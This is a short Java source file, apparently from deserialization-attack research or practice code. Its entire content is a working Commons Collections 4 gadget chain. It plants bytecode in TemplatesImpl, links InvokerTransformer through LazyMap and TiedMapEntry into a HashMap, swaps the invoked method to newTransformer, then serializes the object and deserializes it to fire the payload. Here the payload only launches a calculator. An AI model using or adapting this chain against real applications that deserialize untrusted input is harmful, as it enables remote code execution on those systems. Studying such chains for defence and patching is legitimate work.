package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.HashMap;
import java.util.Map;

public class CC4CCGadgets6 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer(
                "useServicesMechnism" ,
                null ,null
        );

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap ,transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap ,templates);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry ,"xxx");

        outerMap.clear();

        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        System.out.println(Utils.serialize(hashMap ,"bin/CC4CCGadgets6.bin"));
        Utils.unserialize("bin/CC4CCGadgets6.bin");
    }
}
